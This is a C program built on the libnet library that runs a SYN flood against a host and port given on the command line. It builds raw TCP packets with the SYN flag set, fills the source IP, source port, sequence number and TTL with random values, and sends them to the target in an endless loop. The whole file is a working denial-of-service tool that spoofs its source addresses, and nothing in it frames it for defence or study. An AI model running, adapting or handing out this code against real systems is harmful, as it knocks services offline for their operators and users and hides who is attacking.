#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdint.h>

int main(int argc, char *argv[]){
	libnet_t *l; // Libnet context
	char errbuf[LIBNET_ERRBUF_SIZE], *packet;
	u_int32_t dest_ip;
	u_short dest_port;
	libnet_ptag_t ip_tag = 0, tcp_tag = 0; // Tags for ip and tcp
	int opt, network, byte_count, packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;

	if(argc < 3){
		printf("Usage:%s <target host> <target port>\n", argv[0]);
		exit(1);
	}

	// Libnet initialization
	l = libnet_init(LIBNET_RAW4, NULL, errbuf);
	if(l == NULL){
		fprintf(stderr, "Root required: libnet_init() failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	dest_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE); // The host
	dest_port = (u_short)atoi(argv[2]);						 // The port

	// Initialize seed for random
	libnet_seed_prand(l);

	printf("SYN Flooding port %d of %s..\n", dest_port, argv[1]);
	while(1){ // Loog forever (until break by CTRL-C)
		tcp_tag = libnet_build_tcp(libnet_get_prand(LIBNET_PRu16),		// Source Port (randomized)
					dest_port,								// Destination Port
					libnet_get_prand(LIBNET_PRu32),			// Sequence number (randomized)
					libnet_get_prand(LIBNET_PRu32),			// Acknowledgement number (randomized)
					TH_SYN,									// Control Flags (SYN Flag set only)
					libnet_get_prand(LIBNET_PRu16),			// Window size (randomized)
					0,										// Checksum (0 for autofill)
					0,										// Urgent Pointer
					LIBNET_TCP_H,							// Total length of the TCP
					NULL,									// Payload (none)
					0,										// Length payload
					l,										// Libnet context
					0);

		if(tcp_tag == -1){
			fprintf(stderr,"Unable to build TCP Header: %s\n", libnet_geterror(l));
			libnet_destroy(l);
			exit(EXIT_FAILURE);
		}

		ip_tag = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,			// Size of the packet sans IP header.
				0,								// IP tos(type of service)
				libnet_get_prand(LIBNET_PRu16),	// IP ID (randomized)
				0,								// Frag stuff
				libnet_get_prand(LIBNET_PR8),	// TTL (randomized)
				IPPROTO_TCP,					// Transport protocol
				0,								// Checksum (0 for kernel to fill)
				libnet_get_prand(LIBNET_PRu32),	// Src IP (randomized)
				dest_ip,						// Dst IP
				NULL,							// Payload (none)
				0,								// Length payload
				l,								// Libnet context
				0);								// Tag

		if(ip_tag == -1){
			fprintf(stderr, "Unable to build IP Header: %s\n", libnet_geterror(l));
			libnet_destroy(l);
			exit(EXIT_FAILURE);
		}
		byte_count = libnet_write(l);
		if(byte_count == -1)
			fprintf(stderr, "Warning incomplete packet written %s\n", libnet_geterror(l));

		libnet_clear_packet(l);

		usleep(50);
	}

	libnet_destroy(l); // Free packet memory
}
